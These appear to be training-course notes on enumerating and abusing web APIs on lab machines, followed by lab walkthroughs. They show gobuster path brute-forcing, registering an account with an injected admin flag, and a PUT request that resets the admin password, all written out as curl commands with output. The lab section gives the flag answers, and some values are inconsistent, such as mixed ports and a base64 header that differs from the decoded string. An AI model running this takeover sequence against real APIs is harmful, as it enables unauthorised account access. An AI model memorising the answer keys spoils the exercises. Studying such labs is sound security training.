# Enumerating and Abusing APIs

API Path Naming Convention
>``` shell
>/api_name/v1
>```

Gobuster pattern
>``` shell
>{GOBUSTER}/v1
>{GOBUSTER}/v2
>```

Bruteforcing API Paths
>``` shell
>kali@kali:~$ gobuster dir -u http://192.168.50.16:5002 -w /usr/share/wordlists/dirb/big.txt -p pattern
>
># ========== Expected Result ==========
>===============================================================
>Gobuster v3.1.0
>by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
>===============================================================
>[+] Url:                     http://192.168.50.16:5001
>[+] Method:                  GET
>[+] Threads:                 10
>[+] Wordlist:                /usr/share/wordlists/dirb/big.txt
>[+] Patterns:                pattern (1 entries)
>[+] Negative Status codes:   404
>[+] User Agent:              gobuster/3.1.0
>[+] Timeout:                 10s
>===============================================================
>2022/04/06 04:19:46 Starting gobuster in directory enumeration mode
>===============================================================
>/books/v1             (Status: 200) [Size: 235]
>/console              (Status: 200) [Size: 1985]
>/ui                   (Status: 308) [Size: 265] [--> http://192.168.50.16:5001/ui/]
>/users/v1             (Status: 200) [Size: 241]
># =====================================
>```

Obtaining Users' Information
>``` shell
>kali@kali:~$ curl -i http://192.168.50.16:5002/users/v1
>
># ========== Expected Result ==========
>HTTP/1.0 200 OK
>Content-Type: application/json
>Content-Length: 241
>Server: Werkzeug/1.0.1 Python/3.7.13
>Date: Wed, 06 Apr 2022 09:27:50 GMT
>
>{
>  "users": [
>    {
>      "email": "mail1@mail.com",
>      "username": "name1"
>    },
>    {
>      "email": "mail2@mail.com",
>      "username": "name2"
>    },
>    {
>      "email": "admin@mail.com",
>      "username": "admin"
>    }
>  ]
>}
># =====================================
>```

Discovering extra APIs
>``` shell
>kali@kali:~$ gobuster dir -u http://192.168.50.16:5002/users/v1/admin/ -w /usr/share/wordlists/dirb/small.txt
>
># ========== Expected Result ==========
>===============================================================
>Gobuster v3.1.0
>by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
>===============================================================
>[+] Url:                     http://192.168.50.16:5001/users/v1/admin/
>[+] Method:                  GET
>[+] Threads:                 10
>[+] Wordlist:                /usr/share/wordlists/dirb/small.txt
>[+] Negative Status codes:   404
>[+] User Agent:              gobuster/3.1.0
>[+] Timeout:                 10s
>===============================================================
>2022/04/06 06:40:12 Starting gobuster in directory enumeration mode
>===============================================================
>/email                (Status: 405) [Size: 142]
>/password             (Status: 405) [Size: 142]
>
>===============================================================
>2022/04/06 06:40:35 Finished
>===============================================================
># =====================================
>```

Discovering API unsupported methods
>``` shell
>kali@kali:~$ curl -i http://192.168.50.16:5002/users/v1/admin/password
>
># ========== Expected Result ==========
>HTTP/1.0 405 METHOD NOT ALLOWED
>Content-Type: application/problem+json
>Content-Length: 142
>Server: Werkzeug/1.0.1 Python/3.7.13
>Date: Wed, 06 Apr 2022 10:58:51 GMT
>
>{
>  "detail": "The method is not allowed for the requested URL.",
>  "status": 405,
>  "title": "Method Not Allowed",
>  "type": "about:blank"
>}
># =====================================
>```

Inspecting the 'login' API
>``` shell
>kali@kali:~$ curl -i http://192.168.50.16:5002/users/v1/login
>
># ========== Expected Result ==========
>HTTP/1.0 404 NOT FOUND
>Content-Type: application/json
>Content-Length: 48
>Server: Werkzeug/1.0.1 Python/3.7.13
>Date: Wed, 06 Apr 2022 12:04:30 GMT
>
>{ "status": "fail", "message": "User not found"}
># =====================================
>```

Crafting a POST request against the login API
>``` shell
>kali@kali:~$ curl -d '{"password":"fake","username":"admin"}' -H 'Content-Type: application/json'  http://192.168.50.16:5002/users/v1/login
>
># ========== Expected Result ==========
>{ "status": "fail", "message": "Password is not correct for the given username."}
># =====================================
>```

Attempting new User Registration
>``` shell
>kali@kali:~$ curl -d '{"password":"lab","username":"offsecadmin"}' -H 'Content-Type: application/json'  http://192.168.50.16:5002/users/v1/register
>
># ========== Expected Result ==========
>{ "status": "fail", "message": "'email' is a required property"}
># =====================================
>```

Attempting to register a new user as admin
>``` shell
>kali@kali:~$ curl -d '{"password":"lab","username":"offsec","email":"pwn@offsec.com","admin":"True"}' -H 'Content-Type: application/json' http://192.168.50.16:5002/users/v1/register
>
># ========== Expected Result ==========
>{"message": "Successfully registered. Login to receive an auth token.", "status": "success"}
># =====================================
>```

Logging in as an admin user
>``` shell
>kali@kali:~$ curl -d '{"password":"lab","username":"offsec"}' -H 'Content-Type: application/json'  http://192.168.50.16:5002/users/v1/login
>
># ========== Expected Result ==========
>{"auth_token": "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE2NDkyNzEyMDEsImlhdCI6MTY0OTI3MDkwMSwic3ViIjoib2Zmc2VjIn0.MYbSaiBkYpUGOTH-tw6ltzW0jNABCDACR3_FdYLRkew", "message": "Successfully logged in.", "status": "success"}
># =====================================
>```

Attempting to Change the Administrator Password via a POST request
>``` shell
>kali@kali:~$ curl  \
>  'http://192.168.50.16:5002/users/v1/admin/password' \
>  -H 'Content-Type: application/json' \
>  -H 'Authorization: OAuth eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE2NDkyNzEyMDEsImlhdCI6MTY0OTI3MDkwMSwic3ViIjoib2Zmc2VjIn0.MYbSaiBkYpUGOTH-tw6ltzW0jNABCDACR3_FdYLRkew' \
>  -d '{"password": "pwned"}'
>
># ========== Expected Result ==========
>{
>  "detail": "The method is not allowed for the requested URL.",
>  "status": 405,
>  "title": "Method Not Allowed",
>  "type": "about:blank"
>}
># =====================================
>```

Attempting to Change the Administrator Password via a PUT request
>``` shell
>kali@kali:~$ curl -X 'PUT' \
>  'http://192.168.50.16:5002/users/v1/admin/password' \
>  -H 'Content-Type: application/json' \
>  -H 'Authorization: OAuth eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE2NDkyNzE3OTQsImlhdCI6MTY0OTI3MTQ5NCwic3ViIjoib2Zmc2VjIn0.OeZH1rEcrZ5F0QqLb8IHbJI7f9KaRAkrywoaRUAsgA4' \
>  -d '{"password": "pwned"}'
>```

Successfully logging in as the admin account
>``` shell
>kali@kali:~$ curl -d '{"password":"pwned","username":"admin"}' -H 'Content-Type: application/json'  http://192.168.50.16:5002/users/v1/login
>
># ========== Expected Result ==========
>{"auth_token": "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE2NDkyNzIxMjgsImlhdCI6MTY0OTI3MTgyOCwic3ViIjoiYWRtaW4ifQ.yNgxeIUH0XLElK95TCU88lQSLP6lCl7usZYoZDlUlo0", "message": "Successfully logged in.", "status": "success"}
># =====================================
>```

Lab 1 - Start up the Walkthrough VM 1 and modify the Kali /etc/hosts file to reflect the provided dynamically-allocated IP address that has been assigned to the offsecwp instance. Use Firefox to get familiar with the Developer Debugging Tools by navigating to the offsecwp site and replicate the steps shown in this Learning Unit. Explore the entire WordPress website and inspect its HTML source code in order to find the flag.
>``` shell
># Map Hostname to IP
>kali@kali:~$ sudo nano /etc/hosts
>
># Add this line at the bottom:
>192.168.179.16 offsecwp
>
># Save and exit:
>Ctrl + X
>
># Navigate to http://offsecwp/?p=1
>
># Right-click anywhere on the page, click Inspect, and enter "OS{" in the search bar
>```
>OS{c220cc334635a533cae9c236c2e31aa0}

Lab 2 - Start Walkthrough VM 2 and replicate the curl command we learned in this section in order to map and exploit the vulnerable APIs. Next, perform a brute force attack to discover another API that has a same pattern as /users/v1. Then, perform a query against the base path of the new API: what's the name of the item belonging to the admin user? NOTE: A dirbuster wordlist should help on this task.
>``` shell
># Bruteforcing API Paths
>kali@kali:~$ gobuster dir -u http://192.168.179.16:5002/ -w /usr/share/wordlists/dirb/big.txt -t 20
>
># ========== Expected Result ==========
>...
>/console              (Status: 200) [Size: 1985]
>/ui                   (Status: 308) [Size: 267] [--> http://192.168.179.16:5002/ui/]
>...
># =====================================
>
># Navigate to http://192.168.179.16:5002/ui/
>
># Obtaining Users' Information
>curl -i http://192.168.179.16:5002/books/v1
>
># ========== Expected Result ==========
>HTTP/1.0 200 OK
>Content-Type: application/json
>Content-Length: 235
>Server: Werkzeug/1.0.1 Python/3.7.13
>Date: Wed, 29 Oct 2025 14:22:21 GMT
>
>{
>  "Books": [
>    {
>      "book_title": "bookTitle16", 
>      "user": "name1"
>    }, 
>    {
>      "book_title": "bookTitle97", 
>      "user": "name2"
>    }, 
>    {
>      "book_title": "bookTitle22", 
>      "user": "admin"
>    }
>  ]
>}
># =====================================
>```
>bookTitle22

Lab 3 - This website running on the Exercise VM 1 is dedicated to all things maps! Follow the maps to get the flag.
>``` shell
># Running Gobuster
>kali@kali:~$ gobuster dir -u 192.168.179.52 -w /usr/share/wordlists/dirb/common.txt -t 5
>
># ========== Expected Result ==========
>...
>/index.html           (Status: 200) [Size: 6041]
>/robots.txt           (Status: 200) [Size: 123]
>/sitemap.xml          (Status: 200) [Size: 579]
>...
># =====================================
>
># Navigate to http://192.168.179.52/robots.txt
>
># ========== Expected Result ==========
># Group 1
>User-agent: Googlebot
>Disallow: /
>
># Group 2
>User-agent: PWKStudents
>Disallow: /flag2845817477.html
># =====================================
>
># Navigate to http://192.168.179.52/flag2845817477.html
>
># ========== Expected Result ==========
>The flag part 1 is:
>OS{7e03893c271b899
>
>Look for an important map to find the second part. 
># =====================================
>
># Navigate to http://192.168.179.52/sitemap.xml
>
># ========== Expected Result ==========
>/index.html 2020-02-29 monthly 0.4 /robots.txt 2020-02-29 monthly 0.3 /flagF0FD3925BAE6.html 2020-02-29 weekly 0.8 
># =====================================
>
># Navigate to http://192.168.179.52/flagF0FD3925BAE6.html
>
># ========== Expected Result ==========
>The flag part 2 is:
>0fabfb08a9c0066cb}
># =====================================
>```
>OS{7e03893c271b8990fabfb08a9c0066cb}

Lab 4 - Inspect the Exercise VM 2 web application URL and notice if anything is interesting at the URL level.
>``` shell
># Navigate to http://192.168.179.52/
>
># ========== Expected Result ==========
>http://192.168.179.52/?flag=OS{535865a417fb7a96190a1f769319cf4a}
># =====================================
>```
>OS{535865a417fb7a96190a1f769319cf4a}

Lab 5 - We made another website, but something is wrong. The site is available at Exercise VM 3, but it keeps giving some weird, non-standard responses. Check out the HTTP headers that accompany this site.
>``` shell
># Navigate to http://192.168.179.52/
>
># Right-click anywhere on the page, click Inspect
>
># Navigate to the "Network" tab and refresh the page
>
># Navigate to the initial GET request and inspect the "Response Headers"
>
># ========== Expected Result ==========
>X-Something-Non-Standard: VGhlIGZsYWcgaXM6IE9TezVkM2Q2NmZiYWMwY2I2MzI3YjVmN2RmZmZhN2JhODBhfQ==
># =====================================
>
>kali@kali:~$ echo 'VGhlIGZsYWcgaXM6IE9Te2RkNjJkZTBlZGQzOTJmZmVlZWZiMTliMDQ0Zjg4NTQ1fQ==' | base64 -d
>
># ========== Expected Result ==========
>The flag is: OS{dd62de0edd392ffeeefb19b044f88545}
># =====================================
>```
>OS{dd62de0edd392ffeeefb19b044f88545}

Lab 6 - We made this cool website dedicated to the three web amigos: HTML, CSS, and JavaScript. It is available at the web root on the Exercise VM 4. Closely review each of the three friends to find the flag for this challenge.
>``` shell
># Navigate to http://192.168.179.52/
>
># Right-click anywhere on the page, click Inspect
>
># Navigate to the "Network" tab and refresh the page
>
># ========== Expected Result ==========
>/
>...
>jumbotron.css
>color_flash.js
>...
># =====================================
>
># Navigate to http://192.168.179.52/
>
># Right-click anywhere on the page, click Inspect, and enter "flag" in the search bar
>
># ========== Expected Result ==========
><!--
>Here is part 1 of 3 of your flag: OS{cc37faacf Looking at the source code is a good way to get started on a web challenge. Look at the source of the other parts of this website to find the remaining two parts. Based on initial West Point (USMA) Cyber Team problem by Roy Ragsdale (phlint)
>-->  
># =====================================
>
># Navigate to http://192.168.179.52/jumbotron.css
>
># Search for "flag"
>
># ========== Expected Result ==========
>/*  Here is part 2 of 3 of your flag:
> *
> *  16b90ff2458d
> *
> *  Continue to look around at the other parts of this website to find the remaining flags.
> *  Based on initial West Point (USMA) Cyber Team problem by Roy Ragsdale (phlint)
> */
># =====================================
>
># Navigate to http://192.168.179.52/color_flash.js
>
># ========== Expected Result ==========
>...
>// Congratulations. JavaScript can do much more than just flash colors.
>// The third part of this flag is not actually in a comment source.
>// Instead, you need to visit the console and run the below function.
>// Based on initial West Point (USMA) Cyber Team problem by Roy Ragsdale (phlint)
>function displayflag_6864()
>...
># =====================================
>
># Navigate to http://192.168.179.52/
>
># Right-click anywhere on the page, click Inspect
>
># Navigate to the "Console" tab and enter the following:
>
>displayflag_6864();
>
># ========== Expected Result ==========
>Here is part 3 of 3 of your flag:
>52b3c28fb63}
># =====================================
>```
>OS{cc37faacf16b90ff2458d52b3c28fb63}
